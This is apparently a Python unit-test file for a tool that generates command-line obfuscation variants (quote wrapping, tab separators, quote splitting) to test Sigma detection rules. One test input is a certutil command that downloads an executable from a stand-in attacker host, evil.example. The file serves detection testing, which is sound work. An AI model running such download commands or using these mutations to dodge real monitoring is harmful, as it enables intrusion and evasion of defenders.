import unittest

from sigma_mutate.mutators import generate

BS = chr(92)


class MutatorTests(unittest.TestCase):
    def kinds(self, cmd):
        return {m.mutator for m in generate(cmd)}

    def test_quote_wrap_and_tab(self):
        values = {m.mutator: m.value for m in generate("cmd.exe /c whoami")}
        self.assertIn('"whoami"', values["quote_wrap"])
        self.assertEqual(values["tab_separator"], "cmd.exe\t/c\twhoami")

    def test_short_tokens_get_no_quote_split(self):
        names = {m.label for m in generate("attrib +h +s") if m.mutator == "quote_split"}
        self.assertFalse(any("+h" in n or "+s" in n for n in names))

    def test_never_inserts_next_to_a_backslash(self):
        cmd = "C:" + BS + "dir" + BS + "file.exe"
        for m in generate(cmd):
            if m.mutator == "quote_split":
                self.assertNotIn(BS + '""', m.value)
                self.assertNotIn('""' + BS, m.value)

    def test_every_mutation_differs_from_the_original(self):
        cmd = "certutil.exe -urlcache -f http://evil.example/a.exe a.exe"
        self.assertTrue(all(m.value != cmd for m in generate(cmd, ("argv", "cmd.exe", "program"))))

    def test_default_is_argv_only(self):
        self.assertEqual({m.assumption for m in generate("a.exe -b http://x")}, {"argv"})


if __name__ == "__main__":
    unittest.main()
